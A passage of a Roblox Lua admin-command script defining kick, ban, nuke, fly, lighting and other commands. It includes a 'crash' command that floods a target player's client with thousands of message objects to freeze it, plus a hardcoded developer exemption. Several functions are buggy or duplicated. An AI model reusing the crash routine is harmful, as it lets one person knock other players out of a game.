local CloneF = Instance.new("Folder",workspace) CloneF.Name = "_CONSOLECLONE"
local Plrs = GetPlayersFromString(args[1],sender)
	for _,i in pairs(Plrs) do
i.Character:Clone().Parent = workspace:FindFirstChild("CloneF")
Plrs.Parent = workspace._CONSOLECLONE.Plrs:MakeJoints() Plrs:MoveTo(i.Character:GetModelCFrame().p)
end
end

function Commands.deleteinserts(args,sender)
	MinimumPermission(1,sender)
	if not workspace:FindFirstChild("_Models") then
	Tell(sender,"There's no models that have been inserted.")
	elseif workspace:FindFirstChild("_Models") then
		workspace._Models:remove()
	Tell(sender,"Cleared all insert requests.")
	end
end

function Commands.give(args,sender)
	MinimumPermission(1,sender)
	assert(args[2],"Tool to give is missing.")
	assert(args[1],"Players to give to are missing")
	
	local Plrs = GetPlayersFromString(args[1],sender)
	
	
	local Gears = {}
	
	for _,i in pairs(ReplicatedStorage:GetChildren()) do
		if i:IsA("Tool") then
			table.insert(Gears,i)
		end
	end
	
	for _,i in pairs(Lighting:GetChildren()) do
		if i:IsA("Tool") then
			table.insert(Gears,i)
		end
	end
	
	for _,i in pairs(ServerStorage:GetChildren()) do
		if i:IsA("Tool") then
			table.insert(Gears,i)
		end
	end
		
	for _,i in pairs(Plrs) do
		if i:FindFirstChild("Backpack") then
			for _,Gear in pairs(Gears) do
				if Gear:IsA("Tool") and i.Name:lower():sub(1,#args[2]) == args[2]:lower() then
					Gear:Clone().Parent = i.Backpack
				end
			end
		end
	end
	Tell(sender,"Gave said gear to "..tostring(unpack(Plrs)))
end

function Commands.countdown(args,sender)
	MinimumPermission(1,sender)
local countdownActiveM = false

	
	local tme = assert(tonumber(args[1]),"Countdown time missing or not a number")
	local msg = ""
	
	for c,i in ipairs(args) do
		if c > 1 then
			msg = msg..tostring(i).." "
		end
	end
	
	if countdownActiveM == true then
		Tell(sender,"Wait until the current countdown job finish, or abort the current countdown.",10)
		return
	end
		
		countdownActiveM = true
		warn("Countdown active.")	
		CountdownInProgress = true
	for i = tme, 1, -1 do
		DisplayMessageAll("🕒 Countdown",("\n\ ")..i,3)
				wait(1)
		if StopCountdowns then
			break
		end
	end
		countdownActiveM = false
		wait(1)
			DismissMessageAll()
			warn("Countdown inactive.")
end

local countdownActiveH = false

function Commands.hcountdown(args,sender)
	MinimumPermission(1,sender)
	
	
	local tme = assert(tonumber(args[1]),"Countdown time missing or not a number")
	local msg = ""
	
	if tme < 0 then
		error("Why in the world would I countdown backwards?\n\ I don't get it.")
	end
	for c,i in ipairs(args) do
		if c > 1 then
			msg = msg..tostring(i).."."
					elseif c == 0 then
			error("Why in the world would I countdown zero?\n\ I don't get it.")
		elseif c < 0 then
			error("Why in the world would I countdown backwards?\n\ I don't get it.")
			end
	end
										
		if countdownActiveH == true then
		error("Wait until the current countdown job finish, or abort the current countdown.",10)
		return
		end
		countdownActiveH = true
		warn("Countdown active.")
		CountdownInProgress = true
		
	for i = tme, 1, -1 do
		if i < 2 then
			TellAll(("")..i.. " second remaining.",1.15)
		end
		TellAll(("")..i.. " seconds remaining.",1.15)
		wait(1)
		if StopCountdowns then
			break
		end
	end
	countdownActiveH = false
			warn("Countdown inactive.")
end

--Working on
function Commands.bighead(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to make bighead is missing.\n\n\ bighead 'PlayerName' ")
	
	local Trget = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(Trget) do
		if i.Character:FindFirstChild("Head") then
			i.Character.Head.Mesh.Scale = Vector3.new(5,5,5)
		end
	end
	Tell(sender,"Made "..tostring(unpack(Trget)).." have bighead!")
end

function Commands.biggerhead(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to make biggerhead is missing.\n\n\ biggerhead 'PlayerName' ")
	
	local TargetTheStore = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(TargetTheStore) do
		if i.Character:FindFirstChild("Head") then
			i.Character.Head.Mesh.Scale = Vector3.new(10,10,10)
		end
	end
	Tell(sender,"Made "..tostring(unpack(TargetTheStore)).." have biggerhead! OOF.")
end

--Working on
function Commands.normalhead(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to make head size normal is missing.\n\n\ normalhead 'PlayerName' ")
	
	local Trget = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(Trget) do
		if i.Character:FindFirstChild("Head") then
			i.Character.Head.Mesh.Scale = Vector3.new(1.25,1.25,1.25)
		end
	end
	Tell(sender,"Made "..tostring(unpack(Trget)).."'s head size normal.")
end

function Commands.clearcountdown(...)
	Commands.stopcountdown(...)
end

function Commands.globalshadows(...)
	Commands.gshadows(...)
end

function Commands.jail(...)
	Commands.prison(...)
end

function Commands.disco(args,sender)
	MinimumPermission(1,sender)
			StopDisco = false
	if script._CONSOLEVALUES.Disco.Value == false then
	Tell(sender,"Turned on Disco!")
	script._CONSOLEVALUES.Disco.Value = true
	local oldambient = Lighting.Ambient
	while wait(0.5) and not StopDisco do
		Lighting.Ambient = Color3.new(math.random(),math.random(),math.random())
	end
	Lighting.Ambient = oldambient
	elseif script._CONSOLEVALUES.Disco.Value == true then
	Tell(sender,"Disco already enabled!")
	end	
end

function Commands.undisco(args,sender)
	MinimumPermission(1,sender)
	Tell(sender,"Turned off Disco!")
	script._CONSOLEVALUES.Disco.Value = false
	StopDisco = true
	wait(1)
	StopDisco = false
end

function Commands.ambient(args,sender)
	MinimumPermission(1,sender)
	
		if args[1] == "reset" then
	Lighting.Ambient = Voldambient
		Tell(sender,"Changed Ambient back to default.",7)
		return
	end	
			
	local r = tonumber(args[1])
	local g = tonumber(args[2])
	local b = tonumber(args[3])
	assert(tonumber(args[1]),"Ambient value (red) is missing, or not a number")
	assert(tonumber(args[2]),"Ambient value (green) is missing, or not a number")
	assert(tonumber(args[3]),"Ambient value (blue) is missing, or not a number")
	Lighting.Ambient = Color3.fromRGB(assert(tonumber(args[1])),assert(tonumber(args[2])),assert(tonumber(args[3])))
	Tell(sender,"Changed Ambient to (red: "..assert(tonumber(args[1]))..", green: "..assert(tonumber(args[2]))..", blue: "..assert(tonumber(args[3]))..").",7)
end

function Commands.nuke(args,sender)
	MinimumPermission(2,sender)
	assert(args[1],"Player to nuke is missing.\n\n\ nuke 'PlayerName' ")
	local Trget = GetPlayersFromString(args[1],sender)
	
				local nukes = {}
				local partsHit = {}

				for i,v in pairs(Trget) do
					local char = v.Character
					local human = char and char:FindFirstChild("HumanoidRootPart")
					if human then
						local p = Instance.new("Part")
							p.Name = "OMGITTHENUKEYOHNOOO";
							p.Anchored = true;
							p.CanCollide = false;
							p.formFactor = "Symmetric";
							p.Shape = "Ball";
							p.Material = "Neon";
							p.Size = Vector3.new(1,1,1);
							p.Position = human.Position;
							p.BrickColor = BrickColor.new("New Yeller");
							p.Transparency = .5;
							p.Reflectance = .2;
							p.TopSurface = 0;
							p.BottomSurface = 0;
							p.Parent = workspace;
						
						p.Touched:Connect(function(hit)
							if not partsHit[hit] then
								partsHit[hit] = true
								hit:BreakJoints()
								hit.Anchored = false
							local boom = Instance.new("Explosion")
									boom.Position = hit.Position
									boom.BlastRadius = 100
									boom.BlastPressure = 150
									boom.Parent = workspace
							end
						end)
						table.insert(nukes, p)
local goal = {}
goal.Size = Vector3.new(500, 500, 500)
goal.Color = Color3.new(1, 0, 0)
goal.Transparency = 0.2
local tweenInfo = TweenInfo.new(5, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out)
		
local tween = TweenService:Create(p, tweenInfo, goal)
tween:Play()	
end
end		
Tell(sender,"Nuked "..tostring(unpack(Trget)).."!")			

wait(5)
				for i,v in next,nukes do
					v:Destroy()
				end
				
				nukes = nil
				partsHit = nil
end

function Commands.brightness(args,sender)
	MinimumPermission(1,sender)
	Lighting.Brightness = assert(tonumber(args[1]),"Brightness missing or not a valid number")
	Tell(sender,"Changed Brightness to "..args[1])
end

function Commands.kick(args,sender)
	MinimumPermission(2,sender)
	assert(args[1],"Player to kick is missing.\n\n\ kick 'PlayerName' ")
	local banned = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(banned) do
		i:Kick("\n\An admin has kicked you from this server.")
	end
	
	assert(args[1],"Player to kick is missing.\n\n\ kick 'PlayerName' ")
	local banned = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(banned) do
		i:Kick("\n\An admin has kicked you from this server.")
	end
	
	Tell(sender,"Kicked "..tostring(unpack(banned))..".",3)
		end

function Commands.rootbanhammer(args,sender)
	local onceplease = false
		MinimumPermission(5,sender)
	--	Commands.gear({args[1],10468797},sender)
			local players = GetPlayersFromString(args[1],sender)
		local logoban = script._CONSOLESTUFF.LogiBAN
		
	for _,i in pairs(players) do
		if i:FindFirstChild("Backpack") then
			if onceplease == false then
				onceplease = true
script._CONSOLESTUFF.LogiBAN:Clone().Parent = i.Backpack
				end
		end
		end
	
	Tell(sender,"Given LogiBAN to "..tostring(unpack(players))..".",3)
	onceplease = false
end

function Commands.name(args,sender)
	MinimumPermission(1,sender)
	
	assert(args[1],"Player to rename missing")
	
	local NewName = ""
	
	for a,i in ipairs(args) do
		if a > 1 then
			NewName = NewName..i.." "
		end
	end
	
	local Players = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(Players) do
		if i.Character and i.Character:FindFirstChild("Humanoid") and i.Character:FindFirstChild("Head") then
			for _,i in pairs(i.Character:GetChildren()) do
				if i:IsA("Model") and i:FindFirstChild("NameChange") and i:FindFirstChild("Head") then
					i:Destroy()
				end
			end
			
			local NameModel = Instance.new("Model",i.Character)
			NameModel.Name = game:FindFirstChildOfClass("Chat"):FilterStringForBroadcast(NewName, sender)
			
			local FakeHead = i.Character.Head:Clone()
			FakeHead.Parent = NameModel
			FakeHead.Transparency = 0
			
			local NCHumanoid = Instance.new("Humanoid", NameModel)
			NCHumanoid.Name = "NameChange"
			NCHumanoid.MaxHealth = 0
			NCHumanoid.Health = 0
			
			local Weld = Instance.new("Weld", FakeHead)
			Weld.Part0 = FakeHead
			Weld.Part1 = i.Character.Head
			
			i.Character:FindFirstChild("Head").Transparency = 1
			i.Character:FindFirstChild("Head"):FindFirstChild("Mesh"):Clone().Parent = FakeHead
		end
	end
	
	Tell(sender,"Renamed "..tostring(unpack(Players)).." to "..NewName..".",3)

end

function Commands.rename(...)
	Commands.name(...)
end

function Commands.unname(args,sender)
	MinimumPermission(1,sender)
	
	assert(args[1],"Player to unname is missing.\n\n\ unname 'PlayerName' ")
	
	local Players = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(Players) do
		if i.Character and i.Character:FindFirstChild("Head") then
			for _,i in pairs(i.Character:GetChildren()) do
				if i:IsA("Model") and i:FindFirstChild("NameChange") and i:FindFirstChild("Head") then
					i:Destroy()
				end
			end
			i.Character:FindFirstChild("Head").Transparency = 0
		end
	end
	
	Tell(sender,"Unnamed "..tostring(unpack(Players)),3)

end

function Commands.char(args,sender)
	MinimumPermission(1,sender)
	
	local Players = GetPlayersFromString(assert(args[1],"Player to change char is missing."),sender)
	local UserId = assert(args[2],"The said characteristics is missing!")
	local newchar =  game:FindFirstChildOfClass("Players"):GetUserIdFromNameAsync(UserId)
	for _,i in pairs(Players) do
		if i.Character and i.Character:FindFirstChild("HumanoidRootPart") then
		local CharPos = i.Character:GetModelCFrame()
			i.CharacterAppearanceId = newchar
			i:LoadCharacter()
			i.CharacterAppearanceId = newchar
			i.Character:MoveTo(CharPos.p)
		end
	end
	
	Tell(sender,"Changed the characteristics of "..tostring(unpack(Players)).." to user "..tostring(args[2]),3)

end

function Commands.unchar(args,sender)
	MinimumPermission(1,sender)
	
	local Players = GetPlayersFromString(assert(args[1],"Player to unchar is missing."),sender)
	
	for _,i in pairs(Players) do
	local Reg = i.UserId
		if i.Character and i.Character:FindFirstChild("Head") then
			local CharPos = i.Character:GetModelCFrame()
			i.CharacterAppearanceId = Reg
			i:LoadCharacter()
			i.Character:MoveTo(CharPos.p)
		end
	end
	
	Tell(sender,"Changed the characteristics of "..tostring(unpack(Players)).." back to default.",3)

end

function Commands.ban(args,sender)
	MinimumPermission(2,sender)
	assert(args[1],"Player to ban is missing.\n\n\ ban 'PlayerName' ")
	local banned = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(banned) do
		table.insert(BannedPlayers,i.Name)
		i:Kick("\n\An admin has banned you from this server only;\n\ You're not banned from other servers.")
	end
	
	Tell(sender,"Banned "..tostring(unpack(banned))..".",3)
	assert(args[1],"Player to ban is missing.\n\n\ ban 'PlayerName' ")
	
	local banned = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(banned) do
		table.insert(BannedPlayers,i.Name)
		i:Kick("\n\An admin has banned you from this server only;\n\ You're not banned from other servers.")
	end
	
	Tell(sender,"Banned "..tostring(unpack(banned))..".",3)
end

function Commands.crash(args,sender)
	MinimumPermission(2,sender)
	if game.PlaceId ~= 896250178 and sender.UserId ~= 8270409 then
	assert(args[1],"Player to crash is missing.\n\n\ crash 'PlayerName' ")
	local banned = GetPlayersFromString(args[1],sender)
	
	Tell(sender,"Crashing "..tostring(unpack(banned))..".",3)
	
	while wait() do
		for _,i in pairs(banned) do
					if i.Name == "TechnologicalByte" and game.PlaceId == 896250178 then
			DisplayMessage(sender,"Access Denied","You can't crash TechnologicalByte from the test server!",5)
			return
		end
			pcall(function()
				for _,a in pairs(i:GetChildren()) do
					if a:IsA("PlayerGui") then
						while wait() do
							for b = 1, 9995 do
								Instance.new("Message",a).Text = "Goodbye mate,\n\ someone has crashed you mate.\n\ Don't blame me, blame whoever crashed you."
							end
							wait(4)
						i:kick("\n\ You've been kicked from the server.")
						end
					end
				end
			end)
		end
	end
	elseif game.PlaceId == 896250178 and  sender.UserId ~= 8270409 then
		DisplayMessage(sender,"Access Denied","You can't use the crash command from the test server!",5)
	elseif game.PlaceId == 896250178 and sender.UserId == 8270409 then
		assert(args[1],"Player to crash is missing.\n\n\ crash 'PlayerName' ")
	local banned = GetPlayersFromString(args[1],sender)
	
	Tell(sender,"Crashing "..tostring(unpack(banned))..".",3)
	
	while wait() do
		for _,i in pairs(banned) do
					if i.Name == "TechnologicalByte" and game.PlaceId == 896250178 then
			DisplayMessage(sender,"Access Denied","You can't crash TechnologicalByte from the test server!",5)
			return
		end
			pcall(function()
				for _,a in pairs(i:GetChildren()) do
					if a:IsA("PlayerGui") then
						while wait() do
							for b = 1, 9995 do
								Instance.new("Message",a).Text = "Goodbye mate,\n\ someone has crashed you mate.\n\ Don't blame me, blame whoever crashed you."
							end
							wait(4)
						i:kick("\n\ You've been kicked from the server.")
						end
					end
				end
			end)
		end
	end		
		end
end



function Commands.noclip(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to noclip is missing.\n\n\ noclip 'PlayerName' ")
	local flyme = GetPlayersFromString(args[1],sender)
	for _,i in pairs(flyme) do
		script._CLIENTEXECUTOR.Console_Noclip:Clone().Parent = i:FindFirstChild("PlayerGui")
		local enabled = Instance.new("BoolValue")
		enabled.Parent = i:FindFirstChild("PlayerGui").Console_Noclip
		enabled.Value = true
		enabled.Name = "Enabled"
	end
	
	Tell(sender,"Noclipped "..tostring(unpack(flyme))..".",3)
end


function Commands.loop(args,sender)
	MinimumPermission(1,sender)
	stoploops = false
	local timing = assert(args[1],"Add some arguments here chop chop!")
	local num = 3
	
	if not tonumber(args[1]) then
		num = 2
	end
	
	local cmd = assert(args[num-1],"Add some arguments here chop chop")
	
	if cmd:lower() == "loop" then
		error("Why do you want to loop the loop command?")
	end
	
	if cmd:lower() == "nuke" then
		error("No. You are NOT going to loop the nuke command.")
	end
	
	if cmd:lower() == "explorer" then
		error("Now, why would you do that?")
	end
	
	if cmd:lower() == "clone" then
		error("Now, why would you do that?")
	end
	
	if cmd:lower() == "charrain" then
		error("Now, why would you do that?")
	end
	
	local docmd = assert(Commands[args[num-1]],"The command requested doesn't exist in admin. Check your spelling.")
	
	local newargs = {}
	
	for i = num,#args do
		newargs[i-(num-1)] = args[i]
	end
	
spawn(function()
		while wait(timing) and not stoploops do
			pcall(function()
				docmd(newargs,sender)
			end)
		end
	end)
	
	Tell(sender,"Looping "..cmd.." every "..timing.." seconds!")
end


--idk
--[[
function Commands.autoexecuterespawn(args,sender)
	MinimumPermission(1,sender)
	local build = ""
	for _,i in pairs(args) do
		build = build..i.." "
	end
	build = build:sub(1,#build-1):gsub("%[playername%]","%[PlayerName%]")
	
	AutoExecuteRespawn = ""
	for i in build:lower():gmatch("[^;]+") do
		AutoExecuteRespawn = AutoExecuteRespawn..i.."\n"
	end
	
	Tell(sender,"Changed AutoExecuteRespawn!")
end]]
--[[
function Commands.rootcommandscript(args,sender)
	MinimumPermission(2,sender)
	local build = ""
	for _,i in ipairs(args) do
		build = build..i.." "
	end
	build = build:sub(1,#build-1):gsub("%[playername%]","%[PlayerName%]")
	
	Tell(sender,"Running CommandScript!...")
	
	CmdScriptBuild = ""
	for i in build:lower():gmatch("[^;]+") do
		Chatted(root,i)
	end
	
	Tell(sender,"Ran CommandScript!")
end]]

function Commands.fly(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to fly is missing.\n\n\ fly 'PlayerName' ")
	local flyme = GetPlayersFromString(args[1],sender)
	for _,i in pairs(flyme) do
		for _,i in pairs(flyme) do
	script._CLIENTEXECUTOR.Console_Fly:Clone().Parent = i:FindFirstChild("PlayerGui")
	end
	end
	
	Tell(sender,"Flown "..tostring(unpack(flyme))..".",3)
end

function Commands.unfly(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to unfly is missing.")
	local unfly = GetPlayersFromString(args[1],sender)	
	for _,i in pairs(unfly) do
		for _,i in pairs(unfly) do
	script._CLIENTEXECUTOR.UnflyClip:Clone().Parent = i:FindFirstChild("PlayerGui")
	end
	end
	
	Tell(sender,"Unflown "..tostring(unpack(unfly))..".",3)
end

function Commands.unnoclip(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to unnoclip is missing.")
	
	local unfly = GetPlayersFromString(args[1],sender)
		for _,i in pairs(unfly) do
	script._CLIENTEXECUTOR.UnflyClip:Clone().Parent = i:FindFirstChild("PlayerGui")
	end
	Tell(sender,"Clipped "..tostring(unpack(unfly))..".",3)
end

function Commands.clip(...)
	Commands.unnoclip(...)
end

function Commands.unban(args,sender)
	MinimumPermission(2,sender)
	assert(args[1],"Player to unban is missing.")
	
	if args[1] == "all" or args[1] == "others" then
		BannedPlayers = {}
		Tell(player,"Cleared ban list.",3)
		return
	end	
	
	local tounban
	for a,i in pairs(BannedPlayers) do
		if i:lower():sub(1,#args[1]) == args[1]:lower() then
			if not tounban then
				tounban = a
			else
				error(args[1].." is ambiguous on the ban list. Try being more specific.")
			end
				Tell(sender,"Unbanned "..tostring(unpack(BannedPlayers,i.Name))..".",3)
		end
	end
	
	table.remove(BannedPlayers,tounban)
end

function Commands.admin(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to admin is missing.")
	local toadmin = "nope"
	pcall(function()
		toadmin = GetPlayersFromString(args[1],sender)
	end)
	if toadmin == "nope" then
		table.insert(Admins,args[1])
		Tell(sender,"Added "..tostring(args[1]).." to the admin list.",3)
	else
		for _,i in pairs(toadmin) do
			if Permissions[i.Name] <= 1 then
				table.insert(Admins,i.Name)
				Permissions[i.Name] = 1
				Tell(i,sender.Name.." has granted you regular Admin permissions. Say "..CommandPrefix.."cmds for a list of commands, you can do most things besiding kicking, banning, or punishing.",10)
			end
		end
		Tell(sender,"Admined "..tostring(unpack(toadmin))..".",3)
	end
end

function Commands.unadmin(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to unadmin is missing.")
	local admin = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(admin) do
		for a,b in pairs(Admins) do
			if b:lower() == i.Name:lower() and ((Permissions[sender.Name] < 2 and Permissions[b.Name] < 2) or Permissions[sender.Name] >= 2) then
				Permissions[i.Name] = 0
			end
		end
		for a,b in pairs(SuperAdmins) do
			if b:lower() == i.Name:lower() and (Permissions[sender.Name] >= 2) and i.userId ~= game.CreatorId then
				Permissions[i.Name] = 0
			end
		end
		Tell(i,sender.Name.." has removed your Admin permissions. Sorry about that.",9)
	end
	
	Tell(sender,"Unadmined "..tostring(unpack(admin))..".",3)
end

function Commands.superadmin(args,sender)
	MinimumPermission(2,sender)
	assert(args[1],"Player to super admin is missing.")
	local toadmin = "nope"
	pcall(function()
		toadmin = GetPlayersFromString(args[1],sender)
	end)
	if toadmin == "nope" then
		table.insert(Admins,args[1])
		Tell(sender,"Added "..tostring(args[1]).." to the super admin list.",3)
	else
		for _,i in pairs(toadmin) do
			if Permissions[i.Name] <= 1 then
				table.insert(Admins,i.Name)
				Permissions[i.Name] = 2
				Tell(i,sender.Name.." has granted you Super Admin permissions. Say "..CommandPrefix.."cmds for a list of commands, you can do most things besiding kicking, banning, or punishing.",10)
			end
		end
		Tell(sender,"Super Admined "..tostring(unpack(toadmin))..".",3)
	end
end

function Commands.punish(args,sender)
	MinimumPermission(2,sender)
	assert(args[1],"Player to punish is missing.")
	local punish = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(punish) do
		local c = i.Character
		c.Parent = ServerScriptService
	end
	Tell(sender,"Punished "..tostring(unpack(punish))..".",3)
end

function Commands.givebtools(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to give build tools is missing.")
	local players = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(players) do
		if i:FindFirstChild("Backpack") then
			local F3X = script._CONSOLESTUFF:FindFirstChild("F3X Tools")
			local F3XNew = script._CONSOLESTUFF:FindFirstChild("Building Tools")
			
	if F3X and not F3XNew then
			F3X:Clone().Parent = i.Backpack
	end
	if F3XNew and not F3X then
		F3XNew:Clone().Parent = i.Backpack
	end
	
	if workspace.FilteringEnabled == false then
	Tell(sender,"Gave "..tostring(unpack(players)).." Building Tools.",3)
			end
	if workspace.FilteringEnabled == true then
	Tell(sender,"Gave "..tostring(unpack(players)).." Building Tools.",3)
	end
		end
		end
end

function Commands.btools(...)
	Commands.givebtools(...)
end

function Commands.unbtools(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to take build tools is missing.")
	local players = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(players) do
		if i:FindFirstChild("Backpack") then
			for _,a in pairs(i:FindFirstChild("Backpack"):GetChildren()) do
			end
		end
	end
	
	Tell(sender,"Took Building Tools from "..tostring(unpack(players))..".",3)
end


--[[
function Commands.createpart(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to create part is missing.\n\n\ createpart 'PlayerName' ")
	local players = GetPlayersFromString(args[1],sender)

	if not workspace:FindFirstChild("_ConsoleParts") then
	local Folder = Instance.new("Folder",workspace)
	Folder.Name = "_ConsoleParts"
	end
	
		for _,i in pairs(players) do
			if i.Character:FindFirstChild("Head") then
				local mode = Instance.new("Model",workspace) mode.Name = "_ConsolePart"
				local newprt = Instance.new("Part")  
				newprt.Parent = workspace._ConsolePart 
				mode.Parent = workspace._ConsoleParts
				mode:MakeJoints() mode:MoveTo(i.Character:GetModelCFrame().p)
			end
		end
			Tell(sender,"New part created, located in: "..tostring(unpack(players))..".",3)
end]]

--[[
function Commands.disablesb(args,sender)
	MinimumPermission(2,sender)

	
	for _,i in pairs(Scripts) do
		i.Disabled = true
		TellAll("Scripts have been disabled. All detectable scripts have been disabled.")
	end
	
	DisableSB = true
	
	for _,i in pairs(Players:GetPlayers()) do
		if i:FindFirstChild("PlayerGui") then
			for _,a in pairs(i:FindFirstChild("PlayerGui"):GetChildren()) do
				if a.Name ~= "dConsole" or not a:IsA("ScreenGui") and a.Name ~= "HealthGUI" then
					a:Destroy()
				end
			end
			i:FindFirstChild("PlayerGui").ChildAdded:connect(function(a)
				if DisableSB then
					if a.Name ~= "dConsole" or not a:IsA("ScreenGui") and a.Name ~= "HealthGUI" then
						a:Destroy()
					end
				end
			end)
		end
	end
	
	Tell(sender,"Script Builder Disabled",3)
	
end

function Commands.enablesb(args,sender)
	MinimumPermission(2,sender)
	
	
	DisableSB = false
	
	for _,i in pairs(Players:GetPlayers()) do
		i:LoadCharacter()
	end
	
	Tell(sender,"Script Builder Enabled",3)
end
]]
function Commands.unpunish(args,sender)
	MinimumPermission(2,sender)
	assert(args[1],"Player to unpunish is missing.")
	local punish = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(punish) do
		local c = i.Character.Name
		if not ServerScriptService:FindFirstChild(c) then
			error("The player "..c.. " isn't punished!\n\n\Why would I unpunish something that's not punished?")
			return
		end
		ServerScriptService:FindFirstChild(c).Parent = workspace
	end
	Tell(sender,"Unpunished "..tostring(unpack(punish))..".",3)
end

function Commands.clean(args,sender)
	MinimumPermission(1,sender)
	
	if workspace:FindFirstChild("_ConsoleRaig") then
		workspace:FindFirstChild("_ConsoleRaig"):remove()
	end
	
	if workspace:FindFirstChild("_ConsoleClone") then
		workspace:FindFirstChild("_ConsoleClone"):remove()
	end
	
	if workspace:FindFirstChild("OMGITTHENUKEYOHNOOO") then
		workspace:FindFirstChild("OMGITTHENUKEYOHNOOO"):remove()
	end
	
	for _,i in pairs(workspace:GetChildren()) do
		if i:IsA("Tool") or i:IsA("Message") or i:IsA("Hint")  then
			i:Destroy()
		end
	end
	
	Tell(sender,"Cleaned!",3)
end

function Commands.day(args,sender)
	MinimumPermission(1,sender)
	
local goal = {}
goal.ClockTime = 14
local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local tween = TweenService:Create(Lighting, tweenInfo, goal)
tween:Play()	
	
	Tell(sender,"It's day now!",3)
end

function Commands.dawn(args,sender)
	MinimumPermission(1,sender)
	
local goal = {}
goal.ClockTime = 6

local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local tween = TweenService:Create(Lighting, tweenInfo, goal)
tween:Play()	
	
	Tell(sender,"Good morning!",3)
end

function Commands.night(args,sender)
	MinimumPermission(1,sender)
	
local goal = {}
goal.ClockTime = 0
local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local tween = TweenService:Create(Lighting, tweenInfo, goal)
tween:Play()	
	
	Tell(sender,"It's night now!",3)
end

function Commands.dusk(args,sender)
	MinimumPermission(1,sender)
	
local goal = {}
goal.ClockTime = 16
local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local tween = TweenService:Create(Lighting, tweenInfo, goal)
tween:Play()	
	
	Tell(sender,"Good night!",3)
end

function Commands.fog(args,sender)
	MinimumPermission(1,sender)
	
	Lighting.FogEnd = tonumber(args[1]) or 100
	
	Tell(sender,"It's foggy out now!",3)
end

function Commands.nofog(args,sender)
	MinimumPermission(1,sender)
	
	Lighting.FogEnd = 100000
	
	Tell(sender,"It's no longer foggy out now!",3)
end

function Commands.unfog(args,sender)
	MinimumPermission(1,sender)
	
	Lighting.FogEnd = 100000
	
	Tell(sender,"It's no longer foggy out now!",3)
end


function Commands.kill(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to kill is missing.")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if i.Character then
			i.Character:BreakJoints()--ham ham ham ham
		end
	end
	
	Tell(sender,"Killed "..tostring(unpack(player))..".",3)
end

function Commands.jump(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to jump is missing.")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if i.Character and i.Character:FindFirstChild("Humanoid") then
			i.Character:FindFirstChild("Humanoid").Jump = true
		end
	end
	Tell(sender,"Jumped "..tostring(unpack(player))..".",3)
end

function Commands.fliptable(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to flip table at is missing.\n\n\ fliptable 'PlayerName' ")
		
local Plrs = GetPlayersFromString(args[1],sender)
if not workspace:FindFirstChild("_ConsoleRaig") then
local Raig = Instance.new("Folder")
	Raig.Parent = workspace
	Raig.Name = "_ConsoleRaig"
end
for _,i in pairs(Plrs) do
	local torso =i.Character:FindFirstChild('HumanoidRootPart')
local ThrowTable= Instance.new('Part')
	--ThrowTable.Shape = 'Ball'
	ThrowTable.FormFactor='Custom'
	ThrowTable.Size = Vector3.new(4.8, 2.43, 3.63)
	ThrowTable.CanCollide = true
	ThrowTable.Name = "_ConsoleRaig"
	local tmesh = Instance.new('SpecialMesh')
	tmesh.MeshId = 'http://www.roblox.com/asset/?id=111868131'
	tmesh.TextureId = 'http://www.roblox.com/asset/?id=111867655'
	tmesh.Parent = ThrowTable
	local ntable =  ThrowTable:Clone()
	
	ntable.Parent = workspace:FindFirstChild("_ConsoleRaig")	
	ntable.CFrame = i.Character:FindFirstChild('HumanoidRootPart').CFrame-(i.Character:FindFirstChild('HumanoidRootPart').CFrame.lookVector*5)
	
	local bAVel = Instance.new('BodyAngularVelocity')
	bAVel.maxTorque = Vector3.new(math.huge,math.huge,math.huge)
	bAVel.angularvelocity = ((i.Character:FindFirstChild('HumanoidRootPart').CFrame*CFrame.Angles(0,math.pi/2,0)).lookVector*10)
	bAVel.Parent = ntable
	
	local bVel = Instance.new('BodyVelocity')
	bVel.maxForce = Vector3.new(math.huge,0,math.huge)
	bVel.velocity = (torso.CFrame.lookVector*25)
	bVel.Parent = ntable
end
	Tell(sender,"RAIGING at " ..tostring(unpack(Plrs)).."",5)
--error("Not yet implemented")
end

function Commands.fling(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to fling is missing.")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if i.Character and i.Character:FindFirstChild("Humanoid") and i.Character:FindFirstChild("HumanoidRootPart") then
			local xran local zran
		repeat xran = math.random(-9999,9999) until math.abs(xran) >= 5555
